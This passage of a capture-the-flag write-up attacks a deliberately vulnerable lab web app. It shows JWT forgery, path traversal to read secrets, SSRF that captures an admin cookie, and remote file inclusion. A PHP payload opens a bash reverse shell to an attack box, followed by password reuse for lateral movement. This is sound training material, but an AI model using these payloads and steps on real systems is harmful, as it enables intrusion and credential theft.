> // Signature check intentionally disabled
> // $expected = rtrim(base64_encode(hash_hmac('sha256', "$parts[0].$parts[1]", JWT_SECRET, true)),'=');
> // if (!hash_equals($parts[2], $expected)) return null;
> ```
> So the JWT path trusts whatever `role` we put in the payload - we did **not** even need `JWT_SECRET` to forge an admin token; re-using any old signature string works. This is the asymmetry that defines the box: the **cookie** path is secure (HMAC checked + role from DB), but the **JWT** path is not (signature check disabled). Signing the token _properly_ later (once we leak `JWT_SECRET`) is cleaner, but strictly unnecessary.

After several trial and errors, there are two points that stands out:
1. The `reset.php` file can be easily downloaded.
2. To download some other files, the filename must be prefixed with `../`, so `config.php` becomes `$URL/api/files.php?name=../config.php`"

Here is the contents of the `reset.php`. Let's work with this:

```bash
curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NDE3OSwiZXhwIjoxNzkzNTY3Nzc5fQ.veE+PsumJc0msnLUUtQcMkq9NUMemVwCLHN3ZeLbPdA" $URL/api/files.php?name=reset.php
```

```http
HTTP/1.1 200 OK
Date: Sun, 01 Nov 2026 20:22:03 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Authorization
Content-Length: 1403
Content-Type: application/json

{"file":"\/var\/www\/html\/api\/reset.php","content":"<?php\nrequire_once __DIR__ . '\/..\/auth.php';\nheader('Content-Type: application\/json');\nif ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); echo json_encode(['error'=>'Method not allowed']); exit; }\n$data = json_decode(file_get_contents('php:\/\/input'), true);\n$username = trim($data['username'] ?? '');\nif (!$username) { http_response_code(400); echo json_encode(['error'=>'Missing username']); exit; }\n$db = get_db();\n$stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE username = ?');\n$stmt->execute([$username]);\n$row = $stmt->fetch(PDO::FETCH_ASSOC);\nif (!$row) {\n    \/\/ Username enumeration via different response\n    http_response_code(404);\n    echo json_encode(['error' => 'No account found with that username']);\n    exit;\n}\nif ($row['role'] === 'admin') {\n    $masked = substr($row['email'],0,2).str_repeat('*',4).substr($row['email'],strpos($row['email'],'@'));\n    echo json_encode(['message' => \"Password reset instructions sent to $masked\"]);\n    exit;\n}\n$token = bin2hex(random_bytes(16));\n$db->prepare('DELETE FROM reset_tokens WHERE user_id = ?')->execute([$row['id']]);\n$db->prepare('INSERT INTO reset_tokens (token, user_id) VALUES (?, ?)')->execute([$token, $row['id']]);\necho json_encode(['token' => $token, 'reset_url' => '\/reset.php?token='.$token]);\n"}
```

The top line says `require_once __DIR__ . '\/..\/auth.php';`. so let's retrieve that file. It also gives the clue on how to retrieve the other files (i.e., the `config.php` file using the `../` method).

```bash
curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NDE3OSwiZXhwIjoxNzkzNTY3Nzc5fQ.veE+PsumJc0msnLUUtQcMkq9NUMemVwCLHN3ZeLbPdA" $URL/api/files.php?name=../auth.php  
```

```http
HTTP/1.1 200 OK
Date: Sun, 01 Nov 2026 20:26:05 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Authorization
Content-Length: 2382
Content-Type: application/json

{"file":"\/var\/www\/html\/auth.php","content":"<?php\nrequire_once __DIR__ . '\/config.php';\n\nfunction get_session() {\n    if (!isset($_COOKIE['nexus_session'])) return null;\n    $raw = $_COOKIE['nexus_session'];\n    \/\/ Cookie format: base64(json).hmac_sha256(base64(json), APP_SECRET)\n    $parts = explode('.', $raw, 2);\n    if (count($parts) !== 2) return null;\n    $expected_sig = hash_hmac('sha256', $parts[0], APP_SECRET);\n    if (!hash_equals($expected_sig, $parts[1])) return null;\n    $decoded = base64_decode($parts[0]);\n    $data = json_decode($decoded, true);\n    if (!$data || !isset($data['user_id'])) return null;\n    \/\/ Role always fetched from DB - cookie role value ignored\n    $db = get_db();\n    $stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE id = ?');\n    $stmt->execute([$data['user_id']]);\n    return $stmt->fetch(PDO::FETCH_ASSOC);\n}\n\nfunction require_login() {\n    $user = get_session();\n    if (!$user) { header('Location: \/index.php'); exit; }\n    return $user;\n}\n\nfunction require_admin() {\n    $user = require_login();\n    if ($user['role'] !== 'admin') {\n        http_response_code(403);\n        header('Content-Type: application\/json');\n        echo json_encode(['error' => 'Forbidden']);\n        exit;\n    }\n    return $user;\n}\n\nfunction generate_jwt($username) {\n    $header = rtrim(base64_encode(json_encode(['alg'=>'HS256','typ'=>'JWT'])), '=');\n    \/\/ Bug: role always set to \"user\" regardless of actual user role\n    $payload = rtrim(base64_encode(json_encode([\n        'sub' => $username,\n        'role' => 'user',\n        'iat' => time(),\n        'exp' => time() + 3600\n    ])), '=');\n    $sig = rtrim(base64_encode(hash_hmac('sha256', \"$header.$payload\", JWT_SECRET, true)), '=');\n    return \"$header.$payload.$sig\";\n}\n\nfunction verify_jwt($token) {\n    $parts = explode('.', $token);\n    if (count($parts) !== 3) return null;\n    $payload = json_decode(base64_decode($parts[1]), true);\n    if (!$payload) return null;\n    \/\/ Signature check intentionally disabled\n    \/\/ $expected = rtrim(base64_encode(hash_hmac('sha256', \"$parts[0].$parts[1]\", JWT_SECRET, true)),'=');\n    \/\/ if (!hash_equals($parts[2], $expected)) return null;\n    if (isset($payload['exp']) && $payload['exp'] < time()) return null;\n    return $payload;\n}\n?>\n"}
```

> [!Info] Read this file carefully. It is the heart of the box.
> Two commented-out lines explain every success and failure so far:
> - **Cookie is safe:** `get_session()` checks the HMAC _and_ re-reads the role from the DB (`// Role always fetched from DB - cookie role value ignored`). -> our cookie forge was doomed twice over.
> - **JWT is unsafe:** `verify_jwt()` has `// Signature check intentionally disabled`. -> our JWT forge trusted the payload `role` and worked.
> - Bonus: `generate_jwt()` hard-codes `'role' => 'user'`, so the _legitimate_ token endpoint will never hand out an admin token - forging is the only way.

The new content includes the `require_once __DIR__ . '\/config.php`, so let's retrieve that:

```bash
curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NDE3OSwiZXhwIjoxNzkzNTY3Nzc5fQ.veE+PsumJc0msnLUUtQcMkq9NUMemVwCLHN3ZeLbPdA" $URL/api/files.php?name=../config.php
```

```http
HTTP/1.1 200 OK
Date: Sun, 01 Nov 2026 20:27:47 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Authorization
Content-Length: 480
Content-Type: application/json

{"file":"\/var\/www\/html\/config.php","content":"<?php\ndefine('DB_HOST', 'localhost');\ndefine('DB_NAME', 'nexusdb');\ndefine('DB_USER', 'app_user');\ndefine('DB_PASS', '<Password goes here>');\ndefine('JWT_SECRET', '<Password goes here>');\ndefine('APP_SECRET', '<Password goes here>');\n\nfunction get_db() {\n    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);\n    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n    return $pdo;\n}\n?>\n"}
```

Making it easy to read and BINGO! we have passwords (shown redacted here). Especially the `JWT_SECRET`. This means we can now generate the JWT token signature _properly_ - though, as noted above, the signature isn't actually checked, so this is the clean version rather than a strict requirement.

```
<?php
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexusdb');
define('DB_USER', 'app_user');
define('DB_PASS', '<Password goes here>');
define('JWT_SECRET', '<Password goes here>');
define('APP_SECRET', '<Password goes here>');

function get_db() {
    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    return $pdo;
}
?>
```

> [!Note] Note
>The three secrets above are redacted in this write-up. In the real `config.php` they contain actual values for `DB_PASS`, `JWT_SECRET` and `APP_SECRET`. The `DB_PASS` value is the one we reuse later to `su devops`.

## Generate token for admin user
Here is the function from the `auth.php`:

```php
function generate_jwt($username) {
    $header = rtrim(base64_encode(json_encode(['alg'=>'HS256','typ'=>'JWT'])), '=');
    \/\/ Bug: role always set to \"user\" regardless of actual user role
    $payload = rtrim(base64_encode(json_encode([
        'sub' => $username,
        'role' => 'user',
        'iat' => time(),
        'exp' => time() + 3600
    ])), '=');
    $sig = rtrim(base64_encode(hash_hmac('sha256', \"$header.$payload\", JWT_SECRET, true)), '=');
    return \"$header.$payload.$sig\";
}
```

Let's use the code. Save the contents to `gen3.py` and execute it with `python gen3.py`:

```python
import base64
import hashlib
import hmac
import json
import time

header = '{"alg":"HS256","typ":"JWT"}'
secret_key = "<JWT SECRET GOES HERE>"

now = int(time.time())

payload = json.dumps({
    "sub": "laura.hayes",
    "role": "admin",
    "iat": now,
    "exp": now + 3600
}, separators=(",", ":"))

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

header_encoded = base64url_encode(header.encode("utf-8"))
payload_encoded = base64url_encode(payload.encode("utf-8"))

message = f"{header_encoded}.{payload_encoded}"

signature = hmac.new(
    secret_key.encode("utf-8"),
    message.encode("ascii"),
    hashlib.sha256
).digest()

signature_encoded = base64url_encode(signature)

token = f"{message}.{signature_encoded}"

print(token)
```

This gives the following output:

```txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NTE2MCwiZXhwIjoxNzkzNTY4NzYwfQ.eLAQ7aF0mvFViNRcv0HWOu3BZxC0VZSYnRZ5mxd7REA
```

now, let's attack the `admin/index.php` page with this:

The request:

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NTE2MCwiZXhwIjoxNzkzNTY4NzYwfQ.eLAQ7aF0mvFViNRcv0HWOu3BZxC0VZSYnRZ5mxd7REA" $URL/admin/index.php
```

The response:

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Admin Panel - NexusCorp</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<nav class="navbar">
  <div class="nav-brand"><span class="logo-icon">&#9650;</span> NexusCorp Admin</div>
  <div class="nav-links">
    <a href="/dashboard.php">Portal</a>
    <a href="/logout.php">Logout</a>
  </div>
</nav>
<div class="container">
  <div class="admin-header">
    <h1>Administration Console</h1>
    <p>Logged in as: <strong>laura.hayes</strong></p>
  </div>
  <div class="flag-box">
    <h3>System Status</h3>
    <p>Internal reference: <code>THM{bl1nd_...}</code></p>
  </div>
  <div class="card-grid">
    <div class="card">
      <h3>User Management</h3>
      <p>Manage employee accounts and permissions.</p>
      <a href="/api/users/profile.php?id=1" class="btn-secondary">View User API</a>
    </div>
    <div class="card">
      <h3>File System Access</h3>
      <p>Internal document viewer via authenticated API.</p>
      <p><small>GET /api/files.php?name=[path] with Bearer token</small></p>
    </div>
    <div class="card">
      <h3>Support Queue</h3>
      <p>Pending tickets requiring admin review.</p>
      <p><strong>0</strong> unread tickets</p>    </div>
  </div>
</div>
</body>
</html>

```

BINGO! we have the flag. It's in the response: `<p>Internal reference: <code>THM{bl1nd_...}</code></p>`

# Challenge 3 -  What is the flag obtained after achieving remote code execution on the server? Flag is stored in `/opt/flag3.txt`

Remote code execution and accessing a file at `/opt/flag3.txt` most likely means reverse shell. Two features are in play, and they turn out to be **two different bugs** - it pays to keep them apart:

- **`/support/create.php`** -> stores our `message`, and an automated admin bot later **fetches any URL in it carrying the admin's session cookie** -> **SSRF that leaks laura.hayes's admin session** (first section below). This does _not_ give RCE, but it is a real finding.
- **`/api/files.php?name=`** -> fetches a remote URL and `eval`s it as PHP -> **RFI -> RCE** -> this is the one that yields the shell and `flag3` (second section below).

## The support-ticket path (SSRF -> admin session capture)

![[domino_10.png]]

![[domino_11.png]]

![[domino_12.png]]

![[domino_13.png]]

![[domino_14.png]]

When we create a ticket, its status flips **Pending -> Reviewed** after a few seconds - so _something_ is reading the ticket and acting on it. (We later find that "something" is `/opt/admin_bot.py`.)

Here is the `POST` request captured in Burp Suite (for understanding how the request is crafted):

```http
POST /support/create.php HTTP/1.1
Host: 10.112.167.102
Content-Length: 25
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.112.167.102
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.112.167.102/support/create.php
Accept-Encoding: gzip, deflate, br
Cookie: nexus_session=eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6ImphbWVzLndyaWdodCIsInJvbGUiOiJ1c2VyIn0%3D.a7cecefc21286f22950e0dfba228b0a44998a3d5e6e486134eb97e80d1dc687b
Connection: keep-alive

subject=Test&message=Test
```

Retrieve `create.php` with the same `files.php` read as earlier (generate a fresh admin JWT first, old ones expire):

```bash
python gen3.py 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NTc2NCwiZXhwIjoxNzkzNTY5MzY0fQ.RYst-RHU7-m7BSifGLe-1v_G-6Tu2I5lDnDX7dcF7ew
```

```bash
TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NTc2NCwiZXhwIjoxNzkzNTY5MzY0fQ.RYst-RHU7-m7BSifGLe-1v_G-6Tu2I5lDnDX7dcF7ew

curl -i -H "Authorization: Bearer $TOKEN" $URL/api/files.php?name=../support/create.php
```

**the response**

```http
HTTP/1.1 200 OK
Date: Sun, 01 Nov 2026 20:44:03 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Authorization
Content-Length: 2211
Content-Type: application/json

{"file":"\/var\/www\/html\/support\/create.php","content":"<?php\nrequire_once __DIR__ . '\/..\/auth.php';\n$user = require_login();\n$msg = '';\n$error = '';\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $subject = trim($_POST['subject'] ?? '');\n    $message = trim($_POST['message'] ?? '');\n    if ($subject && $message) {\n        $db = get_db();\n        \/\/ Message stored raw - no XSS filtering (intentional vulnerability)\n        $stmt = $db->prepare('INSERT INTO tickets (user_id, subject, message) VALUES (?, ?, ?)');\n        $stmt->execute([$user['id'], $subject, $message]);\n        $msg = 'Ticket submitted successfully. An admin will review it shortly.';\n    } else {\n        $error = 'Subject and message are required.';\n    }\n}\n?>\n ... (HTML form omitted) ..."}
```

The author's comment advertises XSS - `// Message stored raw - no XSS filtering (intentional vulnerability)`:

```php
   if ($subject && $message) {
        $db = get_db();
        \/\/ Message stored raw - no XSS filtering (intentional vulnerability)
        $stmt = $db->prepare('INSERT INTO tickets (user_id, subject, message) VALUES (?, ?, ?)');
        $stmt->execute([$user['id'], $subject, $message]);
        $msg = 'Ticket submitted successfully. An admin will review it shortly.';
    }
```

But read what the code actually _does_: it stores `message` with a **parameterised** query (so no SQLi) and never fetches or executes anything itself. The whole payload therefore depends on **what the reviewer does with the stored message** - which we have to discover empirically.
### Discovering the real behaviour with Wireshark
First try: drop our URL into a ticket and watch our web server. **Start a webserver** on the attack box. The plan is to download a file from the attack box from the `create.php` page:

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**Insert a link to download a file**. The link `http://10.112.126.205/test.php` points to the IP address of the attack box on which we have a web server currently started.

![[domino_15.png]]

BINGO! The target machine attempts to download the `test.php` file. Of course this file doesn't exist, but this is a good sign. What can we do with this knowledge?

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.112.167.102 - - [01/Nov/2026 20:49:57] code 404, message File not found
10.112.167.102 - - [01/Nov/2026 20:49:57] "GET /test.php HTTP/1.1" 404 -
```

### Let's build a reverse shell
**create a file called test.php on the attack box with the following contents**. The IP address is the IP address of the attack box:

```php
<?php system("bash -c \"bash -i >& /dev/tcp/10.112.126.205/4444 0>&1\""); ?>
```

**start a web server**

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**start a listener**

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
```

**re-generate the JWT token for the admin user**. Note that the testing from the web was done using the token of a non-admin user. From CLI, we need to use the admin user. Also, we generate a new token, since the old token may have expired. It takes time to discover all these steps.

**generate a new JWT token, since the old one might have already expired**

```bash
python gen3.py 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NjUwNiwiZXhwIjoxNzkzNTcwMTA2fQ.4aFfvKCjlkdyQBAuka-JVCm6sUBBIBBVO5x16SozNd4
```

**save the token in a variable**

```bash
TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NjUwNiwiZXhwIjoxNzkzNTcwMTA2fQ.4aFfvKCjlkdyQBAuka-JVCm6sUBBIBBVO5x16SozNd4
```

**request it**

```bash
curl -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/x-www-form-urlencoded" -d "subject=Test3&message=http://10.112.126.205/test.php" $URL/support/create.php
```

No reverse shell appears - **but** our `python3 -m http.server` logs an inbound `GET /test.php`. Something fetched it. To see _what_, capture the traffic and look at the inbound request. Let's try again. this time, let's capture a Wireshark. 

![[domino_16.png]]

![[domino_17.png]]


![[domino_18.png]]

Here is the request extracted from Wireshark:

```
Hypertext Transfer Protocol
    GET /test.php HTTP/1.1\r\n
        [Expert Info (Chat/Sequence): GET /test.php HTTP/1.1\r\n]
            [GET /test.php HTTP/1.1\r\n]
            [Severity level: Chat]
            [Group: Sequence]
        Request Method: GET
        Request URI: /test.php
        Request Version: HTTP/1.1
    Host: 10.112.126.205\r\n
    User-Agent: python-requests/2.31.0\r\n
    Accept-Encoding: gzip, deflate\r\n
    Accept: */*\r\n
    Connection: keep-alive\r\n
    Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834\r\n
        Cookie pair: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834
    \r\n
    [Full request URI: http://10.112.126.205/test.php]
    [HTTP request 1/1]
    [Response in frame: 6705]

```

Two items stand out: 
- the client is **python-requests** (so this is a _server-side_ fetch - **SSRF**, not an in-browser XSS), and 
- it carries a **`nexus_session` cookie**. Decode the cookie's first segment:

```bash
echo 'eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==' | base64 -d
# {"user_id": 1, "username": "laura.hayes", "role": "admin"}
```

When we use that cookie we have obtained from the wireshark:

```bash
curl -b "nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834" $URL/admin/index.php
```

we get the flag for challenge 2

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Admin Panel - NexusCorp</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<nav class="navbar">
  <div class="nav-brand"><span class="logo-icon">&#9650;</span> NexusCorp Admin</div>
  <div class="nav-links">
    <a href="/dashboard.php">Portal</a>
    <a href="/logout.php">Logout</a>
  </div>
</nav>
<div class="container">
  <div class="admin-header">
    <h1>Administration Console</h1>
    <p>Logged in as: <strong>laura.hayes</strong></p>
  </div>
  <div class="flag-box">
    <h3>System Status</h3>
    <p>Internal reference: <code>THM{bl1nd_....}</code></p>
  </div>
  <div class="card-grid">
    <div class="card">
      <h3>User Management</h3>
      <p>Manage employee accounts and permissions.</p>
      <a href="/api/users/profile.php?id=1" class="btn-secondary">View User API</a>
    </div>
    <div class="card">
      <h3>File System Access</h3>
      <p>Internal document viewer via authenticated API.</p>
      <p><small>GET /api/files.php?name=[path] with Bearer token</small></p>
    </div>
    <div class="card">
      <h3>Support Queue</h3>
      <p>Pending tickets requiring admin review.</p>
      <p><strong>0</strong> unread tickets</p>    </div>
  </div>
</div>
</body>
</html>
```

We have just captured **laura.hayes's live, validly-signed admin session cookie**.

>[!Note] Instead of Wireshark
>Instead of using wireshark, we could have used `nc -lvnp 80` which would have given us the cookie right in the terminal:
>```bash
>nc -lvnp 80
>Listening on 0.0.0.0 80
>Connection received on 10.112.167.102 50606
>GET /test.php HTTP/1.1
>Host: 10.112.126.205
>User-Agent: python-requests/2.31.0
>Accept-Encoding: gzip, deflate
>Accept: */*
>Connection: keep-alive
>Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834
>```

### Why it happens - `/opt/admin_bot.py`
Reading the bot (found later as a writable file under `/opt`, see Challenge 5) confirms the mechanism:

```python
APP_SECRET = "<Password goes here>"

def make_session_cookie():
    data = b64encode(json({"user_id": 1, "username": "laura.hayes", "role": "admin"}))
    sig  = hmac_sha256(APP_SECRET, data)          # the exact scheme auth.php verifies
    return data + "." + sig

COOKIE = {"nexus_session": make_session_cookie()}

def process(t):
    urls = re.findall(r"https?://[...]+", t["message"])   # pull every URL from the ticket
    for url in set(urls):
        requests.get(url, cookies=COOKIE, timeout=5)      # fetch each one, WITH the admin cookie
```

So the bug is precise: the reviewer **extracts every URL from the ticket and GETs it with laura's admin cookie attached**. Point it at our listener and the admin cookie rides along - SSRF with credential exfiltration. Two bonus consequences worth recording:

- **`APP_SECRET` is hardcoded here** (`<Password goes here>`) - and it is the exact key `auth.php` uses to sign `nexus_session`. With it we can **forge** a valid admin cookie offline, which re-opens the Challenge-2 "cookie forgery" road we had written off as doomed (we no longer even need to wait for the bot).
- The bot **ignores the HTTP response** (`requests.get(...)` with the result discarded), - its value is purely the **cookie it hands us**.

> [!Tip] Tip
>A netcat listener shows the same cookie without Wireshark `nc -lvnp 80` prints the full inbound request (headers included), so the `Cookie:` line is visible in the terminal. Wireshark just makes a cleaner screenshot for the write-up.
## The RCE path for flag 3: Remote File Inclusion (RFI) via `files.php`
Think back to how `files.php` behaved: `files.php?name=http://<our-ip>/...` actually **fetched our URL** earlier (we saw our Python web server get the hit). That is a clue. Let's get the contents of the `files.php` to see if we can find a vulnerability there. Reading the source confirms the mechanism - and it is not a classic `include()`; it is a **fetch-then-`eval`**:

```bash
curl -H "Authorization: Bearer $TOKEN" $URL/api/files.php?name=../api/files.php
```

```php
// files.php (relevant parts)
$jwt_payload = verify_jwt(substr($auth, 7));
...
if (($jwt_payload["role"] ?? "") !== "admin") {        // admin-JWT gate
    http_response_code(403);
    echo json_encode(["error" => "Admin JWT required. Check your token payload."]);
    exit;
}
$name = $_GET["name"] ?? "";
...
// RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    ...
    ob_start();
    eval(str_replace("<?php", "", $remote));           // <-- the kill line
    $output = ob_get_clean();
    echo json_encode(["output" => $output]);
    exit;
}
// local path branch: realpath() + prefix check confine it to /var/www/html/
```

> [!Info] What the source proves
> 
> - **It's `file_get_contents()` + `eval()`, not `include()`.** So it only needs **`allow_url_fopen`** (which the author's comment says is on), not `allow_url_include`. The `str_replace("<?php", "", $remote)` strips the opening tag before `eval`, so the payload technically doesn't even need a `<?php` wrapper - but keeping it is harmless.
> - **The admin-JWT gate lives here too** (`role !== "admin"` -> 403). That is why the whole chain is tight: no RFI without an admin JWT, and no admin JWT without the disabled-signature bug from Challenge 2. The dominoes are locked in order.
> - The local-file branch runs `realpath()` and checks the `/var/www/html/` prefix - which is why earlier reads needed `../` and refused to leave the web root, while the **remote** branch has no such guard.


BINGO!  It supports RFI (Remote File Inclusion - here implemented as fetch-then-eval). This means we can use it to fetch a file from the attack box:

```php
// RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
if (strpos($name, \"http://\") === 0 || strpos($name, \"https://\") === 0) {
    $remote = @file_get_contents($name);
    if ($remote === false) {
        http_response_code(502);
        echo json_encode([\"error\" => \"Could not fetch remote file\"]);
        exit;
    }
    ob_start();
    eval(str_replace(\"<?php\", \"\", $remote));
    $output = ob_get_clean();
    echo json_encode([\"output\" => $output]);
    exit;
}
```

### Build the reverse shell payload
**Create a file called `test.php` on the attack box** (must be valid PHP, because the target will _execute_ it). The IP is the attack box:

```php
<?php system("bash -c \"bash -i >& /dev/tcp/10.112.126.205/4444 0>&1\""); ?>
```

**start a web server** on the attack box

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**start a listener** on the attack box

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
```

**generate a fresh admin JWT and store it** (tokens expire; `files.php` needs the admin token):

```bash
python gen3.py 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NjUwNiwiZXhwIjoxNzkzNTcwMTA2fQ.4aFfvKCjlkdyQBAuka-JVCm6sUBBIBBVO5x16SozNd4

TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NjUwNiwiZXhwIjoxNzkzNTcwMTA2fQ.4aFfvKCjlkdyQBAuka-JVCm6sUBBIBBVO5x16SozNd4
```

**fire the RFI** - point `files.php?name=` at our hosted PHP payload:

```bash
curl -H "Authorization: Bearer $TOKEN" $URL/api/files.php?name=http://10.112.126.205/test.php
```

BINGO! we have a reverse shell:

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.112.167.102 60404
bash: cannot set terminal process group (818): Inappropriate ioctl for device
bash: no job control in this shell
www-data@tryhackme-2404:/var/www/html/api$ pwd
pwd
/var/www/html/api
```

> [!Info] Two different URL-fetch bugs - don't conflate them
> 
> - `create.php` + `admin_bot.py`: the bot fetches our URL **with laura's admin cookie** -> **SSRF -> admin session capture**. No code runs on the server; the prize is the cookie.
> - `files.php?name=http://.../test.php`: the server fetches our remote file and **`eval`s it as PHP** -> **RFI -> RCE**. This is the one that gives the shell, and it is why the payload had to be PHP containing `system(...)`.

Let's get the flag:

```bash
cat /opt/flag3.txt
THM{rf1_...}
```

# Challenge 4 - What is the flag found in the **devops** user's home directory?
Before we work on the shell, let's stabilise it. We are currently working in the target machine shell via the reverse shell that we have gained access to.
## stabilise the shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
export TERM=xterm
```

## Looking for the flag
We have shell access, but can't access the `devops` directory:

```bash
cd /home/devops
bash: cd: /home/devops: Permission denied
```

We had identified passwords in the `config.php` file. Let's re-use those passwords (the `DB_PASS` value). This is a quite common vulnerability:

```bash
su - devops
Password: 
```

```bash
whoami
devops
```

BINGO! we have authenticated as `devops`.

```bash
pwd
/home/devops
```

```bash
ls -ltra
total 32
-rw-r--r-- 1 devops devops  807 Feb 25  2020 .profile
-rw-r--r-- 1 devops devops 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 devops devops  220 Feb 25  2020 .bash_logout
drwxr-xr-x 4 root   root   4096 Apr 29  2026 ..
-rw-r--r-- 1 devops devops   34 Apr 29  2026 user.txt
drwx------ 2 devops devops 4096 Apr 30  2026 .cache
-rw------- 1 devops devops  317 May  9 17:19 .bash_history
drwxr-x--- 3 devops devops 4096 May  9 17:19 .
```

```bash
cat user.txt 
THM{s5h_...}
```

BINGO! we have the flag.

# Challenge 5 - What is the root flag?
## Look for writable directories

```bash
find / -path /proc -prune -o -path /sys -prune -o -writable -type d -print 2>/dev/null
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/generator.late
/run/user/1001/systemd/generator.late/xdg-desktop-autostart.target.wants
/run/user/1001/systemd/units
/run/user/1001/systemd/propagate
/run/user/1001/systemd/propagate/.os-release-stage
/run/user/1001/systemd/inaccessible
/run/screen
/run/cloud-init/tmp
/run/lock
/tmp
/opt
/dev/mqueue
/dev/shm
/home/devops
/home/devops/.cache
/var/lib/php/sessions
/var/tmp
/var/crash
/var/www/html/admin
